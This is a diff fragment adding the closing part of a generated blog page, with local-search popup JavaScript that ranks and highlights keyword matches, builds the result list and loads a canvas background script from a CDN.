+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
